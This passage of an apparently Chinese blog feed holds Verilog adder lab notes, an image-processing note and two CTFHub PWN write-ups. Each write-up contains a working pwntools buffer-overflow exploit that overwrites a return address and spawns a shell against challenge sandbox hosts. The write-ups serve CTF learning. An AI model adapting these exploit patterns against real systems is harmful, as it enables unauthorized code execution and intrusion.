class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4位串行进位加法器</span></span><br><span class="line"><span class="meta">`<span class="meta-keyword">timescale</span> 1ns / 1ps</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> FourBitFA(X, Y, Cin, Sum, Cout);</span><br><span class="line">    <span class="keyword">parameter</span> size = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">input</span> [size-<span class="number">1</span>:<span class="number">0</span>] X, Y;</span><br><span class="line">    <span class="keyword">output</span> [size-<span class="number">1</span>:<span class="number">0</span>] Sum;</span><br><span class="line">    <span class="keyword">input</span> Cin;</span><br><span class="line">    <span class="keyword">output</span> Cout;</span><br><span class="line">    <span class="keyword">wire</span> [size-<span class="number">1</span>:<span class="number">1</span>] C;</span><br><span class="line">    <span class="comment">//fa(A, B, CI, S, CO);</span></span><br><span class="line">    fa fa0(X[<span class="number">0</span>], Y[<span class="number">0</span>], Cin, Sum[<span class="number">0</span>], C[<span class="number">1</span>]),</span><br><span class="line">        fa1(X[<span class="number">1</span>], Y[<span class="number">1</span>], C[<span class="number">1</span>], Sum[<span class="number">1</span>], C[<span class="number">2</span>]),</span><br><span class="line">        fa2(X[<span class="number">2</span>], Y[<span class="number">2</span>], C[<span class="number">2</span>], Sum[<span class="number">2</span>], C[<span class="number">3</span>]),</span><br><span class="line">        fa3(X[<span class="number">3</span>], Y[<span class="number">3</span>], C[<span class="number">3</span>], Sum[<span class="number">3</span>], Cout);</span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure><p>添加完之后，<code>FourBitFA</code>模块会自动置顶，并且包含<code>fa</code>模块</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110290921329.png" alt="image-20211029092052343" style="zoom:80%;" /><h3 id="添加simulation-sources-1"><a href="#添加simulation-sources-1" class="headerlink" title="添加simulation sources"></a>添加simulation sources</h3><p>可由脚本自动生成（有删改）</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//~ `New testbench</span></span><br><span class="line"><span class="meta">`<span class="meta-keyword">timescale</span>  1ns / 1ps  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> tb_FourBitFA;   </span><br><span class="line">    <span class="comment">// FourBitFA Parameters</span></span><br><span class="line">    <span class="keyword">parameter</span> PERIOD = <span class="number">10</span>; </span><br><span class="line">    <span class="keyword">parameter</span> size  = <span class="number">4</span>;   </span><br><span class="line"></span><br><span class="line">    <span class="comment">// FourBitFA Inputs</span></span><br><span class="line">    <span class="keyword">reg</span>   [size-<span class="number">1</span>:<span class="number">0</span>]  X                        = <span class="number">0</span> ;</span><br><span class="line">    <span class="keyword">reg</span>   [size-<span class="number">1</span>:<span class="number">0</span>]  Y                        = <span class="number">0</span> ;</span><br><span class="line">    <span class="keyword">reg</span>   Cin                                  = <span class="number">0</span> ;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// FourBitFA Outputs</span></span><br><span class="line">    <span class="keyword">wire</span>  [size-<span class="number">1</span>:<span class="number">0</span>]  Sum                      ;</span><br><span class="line">    <span class="keyword">wire</span>  Cout                                 ;</span><br><span class="line"></span><br><span class="line">    FourBitFA #(</span><br><span class="line">        <span class="variable">.size</span> ( size ))</span><br><span class="line">    u_FourBitFA (</span><br><span class="line">        <span class="variable">.X</span>                       ( X     [size-<span class="number">1</span>:<span class="number">0</span>] ),</span><br><span class="line">        <span class="variable">.Y</span>                       ( Y     [size-<span class="number">1</span>:<span class="number">0</span>] ),</span><br><span class="line">        <span class="variable">.Cin</span>                     ( Cin              ),</span><br><span class="line"></span><br><span class="line">        <span class="variable">.Sum</span>                     ( Sum   [size-<span class="number">1</span>:<span class="number">0</span>] ),</span><br><span class="line">        <span class="variable">.Cout</span>                    ( Cout             )</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">initial</span></span><br><span class="line">        &#123;X, Y, Cin&#125; = <span class="number">9&#x27;b0</span>;</span><br><span class="line"><span class="keyword">always</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">#<span class="number">100</span>;</span><br><span class="line">&#123;X, Y, Cin&#125; = &#123;X, Y, Cin&#125; + <span class="number">1&#x27;b1</span>;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure><h3 id="仿真结果-1"><a href="#仿真结果-1" class="headerlink" title="仿真结果"></a>仿真结果</h3><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110291537386.png" alt="image-20211029092445491" style="zoom:80%;" /><h2 id="3-数据流法实现超前进位电路"><a href="#3-数据流法实现超前进位电路" class="headerlink" title="3.数据流法实现超前进位电路"></a>3.数据流法实现超前进位电路</h2><h3 id="添加design-sources-1"><a href="#添加design-sources-1" class="headerlink" title="添加design sources"></a>添加design sources</h3><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4位超前进位电路</span></span><br><span class="line"><span class="meta">`<span class="meta-keyword">timescale</span> 1ns / 1ps</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> CarryAheadAdd(X, Y, Cin, Cout);</span><br><span class="line">    <span class="keyword">parameter</span> size = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">input</span> [size-<span class="number">1</span>:<span class="number">0</span>] X, Y;</span><br><span class="line">    <span class="keyword">input</span> Cin;</span><br><span class="line">    <span class="comment">// output [size-1:0] Sum;</span></span><br><span class="line">    <span class="keyword">output</span> [size:<span class="number">0</span>] Cout;</span><br><span class="line">    <span class="keyword">wire</span> [size:<span class="number">0</span>] C, G, P;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assign</span> C[<span class="number">0</span>] = Cin;</span><br><span class="line">    <span class="keyword">assign</span> P = X ^ Y;</span><br><span class="line">    <span class="keyword">assign</span> G = X &amp; Y;</span><br><span class="line">    <span class="keyword">assign</span> C[<span class="number">1</span>] = G[<span class="number">0</span>] | (P[<span class="number">0</span>] &amp; C[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">assign</span> C[<span class="number">2</span>] = G[<span class="number">1</span>] | (P[<span class="number">1</span>] &amp; (G[<span class="number">0</span>] | (P[<span class="number">0</span>] &amp; C[<span class="number">0</span>])));</span><br><span class="line">    <span class="keyword">assign</span> C[<span class="number">3</span>] = G[<span class="number">2</span>] | (P[<span class="number">2</span>] &amp; (G[<span class="number">1</span>] | (P[<span class="number">1</span>] &amp; (G[<span class="number">0</span>] | (P[<span class="number">0</span>] &amp; C[<span class="number">0</span>])))));</span><br><span class="line">    <span class="keyword">assign</span> C[<span class="number">4</span>] = G[<span class="number">3</span>] | (P[<span class="number">3</span>] &amp; (G[<span class="number">2</span>] | (P[<span class="number">2</span>] &amp; (G[<span class="number">1</span>] | (P[<span class="number">1</span>] &amp; (G[<span class="number">0</span>] | (P[<span class="number">0</span>] &amp; C[<span class="number">0</span>])))))));</span><br><span class="line">    <span class="comment">// assign Sum = P ^ C[3:0];</span></span><br><span class="line">    <span class="keyword">assign</span> Cout = C;</span><br><span class="line"></span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure><h2 id="4-四位超前进位加法器"><a href="#4-四位超前进位加法器" class="headerlink" title="4.四位超前进位加法器"></a>4.四位超前进位加法器</h2><h3 id="添加design-sources-2"><a href="#添加design-sources-2" class="headerlink" title="添加design sources"></a>添加design sources</h3><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4位超前进位加法器</span></span><br><span class="line"><span class="meta">`<span class="meta-keyword">timescale</span> 1ns / 1ps</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> CarryAheadAdder(Sum, Cout, X, Y, Cin);</span><br><span class="line">    <span class="keyword">parameter</span> size = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">input</span> [size-<span class="number">1</span>:<span class="number">0</span>] X, Y;</span><br><span class="line">    <span class="keyword">input</span> Cin;</span><br><span class="line">    <span class="keyword">output</span> [size-<span class="number">1</span>:<span class="number">0</span>] Sum;</span><br><span class="line">    <span class="keyword">output</span> Cout;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">wire</span> [size:<span class="number">0</span>] C;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//CarryAheadAdd(X, Y, Cin, Cout);</span></span><br><span class="line">    CarryAheadAdd CarryAheadAdd_0(X, Y, Cin, C);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//fa(A, B, CI, S, CO);</span></span><br><span class="line">    fa fa0(X[<span class="number">0</span>], Y[<span class="number">0</span>], Cin, Sum[<span class="number">0</span>]),</span><br><span class="line">        fa1(X[<span class="number">1</span>], Y[<span class="number">1</span>], C[<span class="number">1</span>], Sum[<span class="number">1</span>]),</span><br><span class="line">        fa2(X[<span class="number">2</span>], Y[<span class="number">2</span>], C[<span class="number">2</span>], Sum[<span class="number">2</span>]),</span><br><span class="line">        fa3(X[<span class="number">3</span>], Y[<span class="number">3</span>], C[<span class="number">3</span>], Sum[<span class="number">3</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">assign</span> Cout = C[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure><h3 id="添加simulation-sources-2"><a href="#添加simulation-sources-2" class="headerlink" title="添加simulation sources"></a>添加simulation sources</h3><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//~ `New testbench</span></span><br><span class="line"><span class="meta">`<span class="meta-keyword">timescale</span>  1ns / 1ps</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> tb_CarryAheadAdder;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// CarryAheadAdder Parameters</span></span><br><span class="line">    <span class="keyword">parameter</span> PERIOD = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">parameter</span> size  = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// CarryAheadAdder Inputs</span></span><br><span class="line">    <span class="keyword">reg</span>   [size-<span class="number">1</span>:<span class="number">0</span>]  X                        = <span class="number">0</span> ;</span><br><span class="line">    <span class="keyword">reg</span>   [size-<span class="number">1</span>:<span class="number">0</span>]  Y                        = <span class="number">0</span> ;</span><br><span class="line">    <span class="keyword">reg</span>   Cin                                  = <span class="number">0</span> ;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// CarryAheadAdder Outputs</span></span><br><span class="line">    <span class="keyword">wire</span>  [size-<span class="number">1</span>:<span class="number">0</span>]  Sum                      ;</span><br><span class="line">    <span class="keyword">wire</span>  Cout                                 ;</span><br><span class="line"></span><br><span class="line">    CarryAheadAdder #(</span><br><span class="line">        <span class="variable">.size</span> ( size ))</span><br><span class="line">    u_CarryAheadAdder (</span><br><span class="line">        <span class="variable">.X</span>                       ( X     [size-<span class="number">1</span>:<span class="number">0</span>] ),</span><br><span class="line">        <span class="variable">.Y</span>                       ( Y     [size-<span class="number">1</span>:<span class="number">0</span>] ),</span><br><span class="line">        <span class="variable">.Cin</span>                     ( Cin              ),</span><br><span class="line"></span><br><span class="line">        <span class="variable">.Sum</span>                     ( Sum   [size-<span class="number">1</span>:<span class="number">0</span>] ),</span><br><span class="line">        <span class="variable">.Cout</span>                    ( Cout             )</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">initial</span> </span><br><span class="line">        &#123;X, Y, Cin&#125; = <span class="number">9&#x27;b0</span>;</span><br><span class="line">    <span class="keyword">always</span></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">        #<span class="number">100</span>;</span><br><span class="line">&#123;X, Y, Cin&#125; = &#123;X, Y, Cin&#125; + <span class="number">1&#x27;b1</span>;</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure><h3 id="仿真结果-2"><a href="#仿真结果-2" class="headerlink" title="仿真结果"></a>仿真结果</h3><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110291408837.png" alt="image-20211029140834986" style="zoom: 80%;" /><h3 id="原理图（RTL分析）"><a href="#原理图（RTL分析）" class="headerlink" title="原理图（RTL分析）"></a>原理图（RTL分析）</h3><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110291600646.png" alt="img"  /><h2 id="5-板级验证"><a href="#5-板级验证" class="headerlink" title="5.板级验证"></a>5.板级验证</h2><p>经过综合、实现、比特流之后，编写管脚约束文件</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">set_property IOSTANDARD LVCMOS18 [get_ports &#123;X[<span class="number">3</span>]&#125;]</span><br><span class="line">set_property PACKAGE_PIN V5 [get_ports &#123;X[<span class="number">3</span>]&#125;]</span><br><span class="line">set_property -dict &#123;IOSTANDARD LVCMOS18 PACKAGE_PIN T4&#125; [get_ports &#123;X[<span class="number">2</span>]&#125;]</span><br><span class="line">set_property -dict &#123;IOSTANDARD LVCMOS18 PACKAGE_PIN V6&#125; [get_ports &#123;X[<span class="number">1</span>]&#125;]</span><br><span class="line">set_property -dict &#123;IOSTANDARD LVCMOS18 PACKAGE_PIN T5&#125; [get_ports &#123;X[<span class="number">0</span>]&#125;]</span><br><span class="line">set_property -dict &#123;IOSTANDARD LVCMOS18 PACKAGE_PIN T6&#125; [get_ports &#123;Y[<span class="number">3</span>]&#125;]</span><br><span class="line">set_property -dict &#123;IOSTANDARD LVCMOS18 PACKAGE_PIN V7&#125; [get_ports &#123;Y[<span class="number">2</span>]&#125;]</span><br><span class="line">set_property -dict &#123;IOSTANDARD LVCMOS18 PACKAGE_PIN R8&#125; [get_ports &#123;Y[<span class="number">1</span>]&#125;]</span><br><span class="line">set_property -dict &#123;IOSTANDARD LVCMOS18 PACKAGE_PIN U9&#125; [get_ports &#123;Y[<span class="number">0</span>]&#125;]</span><br><span class="line">set_property -dict &#123;IOSTANDARD LVCMOS18 PACKAGE_PIN T9&#125; [get_ports Cin]</span><br><span class="line">set_property -dict &#123;IOSTANDARD LVCMOS18 PACKAGE_PIN U6&#125; [get_ports &#123;Sum[<span class="number">3</span>]&#125;]</span><br><span class="line">set_property -dict &#123;IOSTANDARD LVCMOS18 PACKAGE_PIN R5&#125; [get_ports &#123;Sum[<span class="number">2</span>]&#125;]</span><br><span class="line">set_property -dict &#123;IOSTANDARD LVCMOS18 PACKAGE_PIN U7&#125; [get_ports &#123;Sum[<span class="number">1</span>]&#125;]</span><br><span class="line">set_property -dict &#123;IOSTANDARD LVCMOS18 PACKAGE_PIN R6&#125; [get_ports &#123;Sum[<span class="number">0</span>]&#125;]</span><br><span class="line">set_property -dict &#123;IOSTANDARD LVCMOS18 PACKAGE_PIN R7&#125; [get_ports Cout]</span><br></pre></td></tr></table></figure><p>将程序下载到电路板</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110291524608.jpg" alt="IMG_20211029_152219"></p>]]></content>
      
      
      <categories>
          
          <category> 数字电路 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数字电路 </tag>
            
            <tag> vivado </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像处理20211027</title>
      <link href="/20211027-img-report/"/>
      <url>/20211027-img-report/</url>
      
        <content type="html"><![CDATA[<h2 id="枚举法分析"><a href="#枚举法分析" class="headerlink" title="枚举法分析"></a>枚举法分析</h2><p>通过AB分区的具体状态来判断中心点属于哪一个部分，这里先分析$3*3$的区域（只从该区域无法判断的，先标为无法判断，在之后扩充）</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111032225082.png" alt="image-20211027163226429" style="zoom:50%;" /><h3 id="A-B-1-7"><a href="#A-B-1-7" class="headerlink" title="A:B = 1:7"></a>A:B = 1:7</h3><h4 id="中心点属于B："><a href="#中心点属于B：" class="headerlink" title="中心点属于B："></a>中心点属于B：</h4><p>1.</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111032225232.png" alt="image-20211027163450300" style="zoom:50%;" /><h3 id="A-B-2-6"><a href="#A-B-2-6" class="headerlink" title="A:B = 2:6"></a>A:B = 2:6</h3><h4 id="中心点属于B：-1"><a href="#中心点属于B：-1" class="headerlink" title="中心点属于B："></a>中心点属于B：</h4><p>1.</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110271827914.png" alt="image-20211027182751419" style="zoom:50%;" /><p>2.</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110271829129.png" alt="image-20211027182942660" style="zoom:50%;" /><p>3.</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111032225674.png" alt="image-20211027183546895" style="zoom:50%;" /><p>4.</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110271822184.png" alt="image-20211027182223241" style="zoom:50%;" /><h4 id="无法判断："><a href="#无法判断：" class="headerlink" title="无法判断："></a>无法判断：</h4><p>1.</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111032225464.png" alt="image-20211027183327354" style="zoom:50%;" /><p>若此属于A，否则属于B</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111032226302.png" alt="image-20211027212956035" style="zoom:50%;" /><p>2.</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110271837377.png" alt="image-20211027183721630" style="zoom:50%;" /><p>若此属于A，否则属于B</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110272134857.png" alt="image-20211027213411566" style="zoom: 33%;" /><h3 id="A-B-3-5"><a href="#A-B-3-5" class="headerlink" title="A:B = 3:5"></a>A:B = 3:5</h3><h4 id="中心点属于B：-2"><a href="#中心点属于B：-2" class="headerlink" title="中心点属于B："></a>中心点属于B：</h4><p>1.</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111032225110.png" alt="image-20211027185536565" style="zoom:50%;" /><p>2.</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111032225692.png" alt="image-20211027192253087" style="zoom:50%;" /><p>3.</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110271907870.png" alt="image-20211027190714141" style="zoom:50%;" /><h4 id="无法判断：-1"><a href="#无法判断：-1" class="headerlink" title="无法判断："></a>无法判断：</h4><p>1.</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110271839582.png" alt="image-20211027183947654" style="zoom:50%;" /><p>2.</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110271842191.png" alt="image-20211027184257092" style="zoom:50%;" /><p>3.</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110271849842.png" alt="image-20211027184934756" style="zoom:50%;" /><p>4.</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110271850220.png" alt="image-20211027185030166" style="zoom:50%;" /><p>5.</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110271852873.png" alt="image-20211027185229980" style="zoom:50%;" /><p>6.</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110271853905.png" alt="image-20211027185334882" style="zoom:50%;" /><p>若此属于B</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111032226285.png" alt="image-20211027214115234" style="zoom: 33%;" /><p>若此属于A</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111032226693.png" alt="image-20211027214502426" style="zoom: 33%;" /><p>7.</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111032226874.png" alt="image-20211027192517003" style="zoom:50%;" /><p>若此属于A</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111032227102.png" alt="image-20211027221813830" style="zoom:33%;" /><h3 id="A-B-4-4"><a href="#A-B-4-4" class="headerlink" title="A:B = 4:4"></a>A:B = 4:4</h3><p>全部无法判断</p>]]></content>
      
      
      <categories>
          
          <category> 图像处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> opencv </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFHUB-PWN-ret2shellcode</title>
      <link href="/20211026_ctf_ret2shellcode/"/>
      <url>/20211026_ctf_ret2shellcode/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFHUB-PWN-ret2shellcode"><a href="#CTFHUB-PWN-ret2shellcode" class="headerlink" title="CTFHUB-PWN-ret2shellcode"></a>CTFHUB-PWN-ret2shellcode</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110262106244.png" alt="image-20211026210556140"></p><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110262106440.png" alt="image-20211026210637404"></p><p>从main函数来看，程序运行时会先输出buf_addr，利用exp脚本获取它即可。</p><p>然后程序给出一个输入点，可以通过覆盖完这个输入点，返回到我们获得的buf_addr，再通过溢出达到shellcode</p><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110262121280.png" alt="image-20211026212119240"></p><p>可以看到一串地址，但它会每次变化</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;challenge-2e237696f74ad1c2.sandbox.ctfhub.com&#x27;, 24809)</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;it : [&#x27;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;]&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">shellcode_addr = buf_addr + <span class="number">0x10</span> + <span class="number">0x8</span> + <span class="number">0x8</span></span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh())</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(shellcode_addr) + shellcode</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;someting : &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110262152218.png" alt="image-20211026215229086"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFHUB-PWN-ret2text</title>
      <link href="/20211025_ctf_pwn/"/>
      <url>/20211025_ctf_pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFHUB-PWN-ret2text"><a href="#CTFHUB-PWN-ret2text" class="headerlink" title="CTFHUB-PWN-ret2text"></a>CTFHUB-PWN-ret2text</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110252230640.png" alt="image-20211025223026580"></p><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110252231596.png" alt="image-20211025223114563"></p><p>main函数中的gets函数有溢出漏洞，那么看一下有什么可以利用的。</p><p>查看字符串：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110252232188.png" alt="image-20211025223247146"></p><p>发现有/bin/sh/可以利用，而且它在函数secure中：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110252234761.png" alt="image-20211025223403725"></p><p>本来看到这样一个函数，是想要构造伪随机，预测随机值，使得v3 == v2成立，从而得到shell，但是题目名字ret2text显然是hint，那么我就使用ret2text的方法</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110252239339.png" alt="image-20211025223932289" style="zoom:67%;" /><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110252239862.png" alt="image-20211025223952826" style="zoom: 80%;" /><p>覆盖该变量需要0x78的长度</p><p>再找到/bin/sh/的text段位置：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110252242541.png" alt="image-20211025224238503"></p><p>得到0x4007B8</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;challenge-0297c21d40a13395.sandbox.ctfhub.com&#x27;</span>, <span class="number">29225</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x78</span>) + p64(<span class="number">0x4007B8</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="结果"><a 